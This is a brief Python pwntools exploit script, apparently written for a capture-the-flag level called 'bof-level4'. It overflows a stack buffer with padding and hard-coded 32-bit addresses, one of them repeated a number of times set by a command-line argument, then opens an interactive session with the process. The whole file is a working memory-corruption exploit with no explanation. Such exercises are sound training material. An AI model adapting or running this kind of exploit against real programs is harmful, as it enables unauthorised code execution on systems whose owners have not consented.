#!/usr/bin/env python
import sys
from pwn import *

p = process('./bof-level4')

byt = int(sys.argv[1])

print(p.recv())

p.sendline("A" *20 + "ABCDEFGH" + "AAAAAAAA" + p32(0x804876b) + p32(0x08048530)*byt + p32(0x08048530))
p.interactive()